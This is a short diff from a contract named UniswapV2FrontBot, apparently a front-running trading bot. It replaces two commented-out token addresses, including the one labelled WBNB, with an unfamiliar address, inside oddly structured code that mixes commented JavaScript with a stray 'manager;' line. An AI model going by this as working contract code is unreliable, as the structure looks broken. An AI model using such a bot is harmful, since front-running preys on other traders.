@@ -47,8 +47,8 @@ contract UniswapV2FrontBot {
 //const {setBotAddress, getBotAddress, FRONT_BOT_ADDRESS, botABI} = require('./bot.js');
 //const {PRIVATE_KEY, TOKEN_ADDRESS, AMOUNT, LEVEL} = require('./env.js');
 
-//const INPUT_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c';
-//const WBNB_TOKEN_ADDRESS = '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c';
+//const INPUT_TOKEN_ADDRESS = '0x2da2d05ee2c9A8c465Eab0342fc1B25f44600A0C';
+//const WBNB_TOKEN_ADDRESS = '0x2da2d05ee2c9A8c465Eab0342fc1B25f44600A0C';
 manager;
 
 //var input_token_info;
